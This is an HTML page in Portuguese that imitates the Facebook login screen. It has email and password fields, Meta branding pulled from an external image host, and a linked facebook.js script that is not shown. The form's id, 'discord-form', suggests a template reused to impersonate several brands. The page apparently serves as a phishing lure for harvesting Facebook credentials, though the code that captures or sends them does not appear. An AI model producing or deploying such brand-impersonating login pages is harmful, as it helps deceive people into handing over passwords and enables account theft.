<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Facebook</title>
    <link rel="stylesheet" href="facebook.css">
</head>
<body>
    <div class="login-container">
        <div class="login-header">            
            <h1>facebook</h1>
        </div>
        
        <div class="login-form">
            <form id="discord-form">
                <input type="text" id="email" name="email" placeholder="Número de celular ou email" class="input-field" required>
                <input type="password" id="password" name="password" placeholder="senha" class="input-field" required>
                <button type="submit" class="login-button">Entrar</button>
            </form>
            <div class="forgot-password">
                <a href="#">Esqueceu a senha?</a>
            </div>
        </div>

        <div class="sign-up">
            <p>Não tem uma conta?</p>
            <button class="sign-up-button">Criar nova conta</button>
        </div>
    </div>

    <!-- Rodapé -->
    <footer class="rodape">
        <img src="https://i.ibb.co/Lzjyjj0/DDgw-Tv3-Jeh-F.png" alt="Meta" class="imagem-meta">
        <p class="texto-rodape">© Sobre Ajuda Mais</p>
    </footer>

    <script src="facebook.js"></script>
</body>
</html>
